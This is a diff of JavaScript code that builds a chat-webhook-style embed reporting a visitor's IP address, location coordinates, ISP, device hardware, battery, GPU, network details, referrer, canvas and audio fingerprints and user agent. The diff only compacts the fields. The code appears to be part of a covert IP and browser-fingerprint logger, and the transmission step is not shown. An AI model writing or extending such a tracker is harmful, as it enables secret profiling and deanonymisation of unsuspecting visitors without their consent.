@@ -418,48 +418,26 @@
       color: 0x0065FD,
       timestamp: new Date().toISOString(),
       fields: [
-        // Network / geo
-        { name: '🌐  IP Address',     value: '`' + ipStr + '`',                          inline: true  },
-        { name: '📍  Location',       value: locStr,                                      inline: true  },
-        { name: '🏢  ISP / Org',      value: ispStr,                                      inline: false },
-        { name: '🗺️  Coordinates',   value: ip.latitude && ip.longitude
-                                               ? ip.latitude + ', ' + ip.longitude
-                                               : 'N/A',                                    inline: true  },
-        { name: '⏰  Timezone',       value: (ip.timezone || d.tz) + '  (' + utcLabel + ')',  inline: true  },
-        { name: '🕐  Local Time',     value: d.localTime,                                 inline: false },
-        // Device
-        { name: '🖥️  Screen',        value: d.screenRes + '  @  ' + d.dpr + 'x DPR',   inline: true  },
-        { name: '🪟  Window',         value: d.winSize,                                   inline: true  },
-        { name: '🎨  Color Depth',    value: d.colorDepth,                                inline: true  },
-        { name: '📱  Orientation',    value: d.orient,                                    inline: true  },
-        { name: '💻  Platform',       value: d.platform,                                  inline: true  },
-        { name: '🧠  CPU Cores',      value: String(d.cores),                             inline: true  },
-        { name: '💾  Device RAM',     value: String(d.mem),                               inline: true  },
-        { name: '🔋  Battery',        value: batField,                                    inline: false },
-        // GPU
-        { name: '🎮  GPU Renderer',   value: d.gpuRenderer || 'N/A',                     inline: false },
-        { name: '🖼️  GPU Vendor',    value: d.gpuVendor    || 'N/A',                     inline: true  },
-        { name: '📊  GL Version',     value: d.glVersion    || 'N/A',                     inline: true  },
-        // Network
-        { name: '📡  Connection',     value: (d.connType || 'N/A')
-                                             + ' | ↓ ' + (d.downlink || 'N/A')
-                                             + ' | RTT: ' + (d.rtt || 'N/A'),             inline: true  },
-        { name: '🚦  Save Data',      value: String(d.saveData ?? 'N/A'),                 inline: true  },
-        // Browser
-        { name: '🌍  Language',       value: d.lang + '  [' + d.langs + ']',             inline: false },
-        { name: '👆  Touch Points',   value: String(d.touch),                             inline: true  },
-        { name: '🍪  Cookies',        value: String(d.cookies),                           inline: true  },
-        { name: '🛡️  Do Not Track',  value: String(d.dnt),                               inline: true  },
-        { name: '📦  LocalStorage',   value: String(d.ls),                                inline: true  },
-        { name: '📦  SessionStorage', value: String(d.ss),                                inline: true  },
-        { name: '📄  PDF Viewer',     value: String(d.pdf),                               inline: true  },
-        { name: '🔌  Plugins',        value: d.plugins || 'None',                         inline: false },
-        // Fingerprints
-        { name: '🔗  Referrer',       value: d.referrer,                                  inline: false },
-        { name: '🌐  URL',            value: d.url,                                       inline: false },
-        { name: '🖼️  Canvas FP',     value: '`' + d.canvasFP + '`',                     inline: true  },
-        { name: '🎵  Audio FP',       value: '`' + (d.audioFP?.slice(0,50) || 'N/A') + '`', inline: true },
-        { name: '🔍  User Agent',     value: '```' + d.ua + '```',                        inline: false },
+        { name: '🌐  IP',         value: '`' + ipStr + '`',                                                         inline: true  },
+        { name: '📍  Location',   value: locStr,                                                                     inline: true  },
+        { name: '🏢  ISP / Org',  value: ispStr,                                                                     inline: false },
+        { name: '🗺️  Coords',    value: ip.latitude ? ip.latitude + ', ' + ip.longitude : 'N/A',                   inline: true  },
+        { name: '⏰  Time',       value: (ip.timezone || d.tz) + ' (' + utcLabel + ')  —  ' + d.localTime,          inline: false },
+        { name: '🖥️  Display',   value: d.screenRes + ' @ ' + d.dpr + 'x  |  win ' + d.winSize + '  |  ' + d.colorDepth + '  |  ' + d.orient, inline: false },
+        { name: '💻  Hardware',   value: d.platform + '  |  ' + d.cores + ' cores  |  RAM: ' + d.mem,              inline: false },
+        { name: '🔋  Battery',    value: batField,                                                                   inline: true  },
+        { name: '📡  Network',    value: (d.connType || 'N/A') + '  |  ↓ ' + (d.downlink || '?') + '  |  RTT: ' + (d.rtt || '?'), inline: true },
+        { name: '🎮  GPU',        value: (d.gpuRenderer || 'N/A') + '  (' + (d.gpuVendor || 'N/A') + ')',          inline: false },
+        { name: '🌍  Language',   value: d.lang + '  [' + d.langs + ']',                                           inline: true  },
+        { name: '👆  Touch Pts',  value: String(d.touch),                                                           inline: true  },
+        { name: '🛡️  Privacy',   value: 'Cookies: ' + d.cookies + '  |  DNT: ' + d.dnt + '  |  PDF: ' + d.pdf,   inline: false },
+        { name: '📦  Storage',    value: 'Local: ' + d.ls + '  |  Session: ' + d.ss,                               inline: true  },
+        { name: '🔌  Plugins',    value: d.plugins || 'None',                                                       inline: true  },
+        { name: '🔗  Referrer',   value: d.referrer,                                                                inline: true  },
+        { name: '🌐  URL',        value: d.url,                                                                     inline: false },
+        { name: '🖼️  Canvas FP', value: '`' + (d.canvasFP || 'N/A') + '`',                                        inline: true  },
+        { name: '🎵  Audio FP',   value: '`' + (d.audioFP?.slice(0,50) || 'N/A') + '`',                            inline: true  },
+        { name: '🔍  User Agent', value: '```' + d.ua.slice(0, 900) + '```',                                        inline: false },
       ]
     };
 
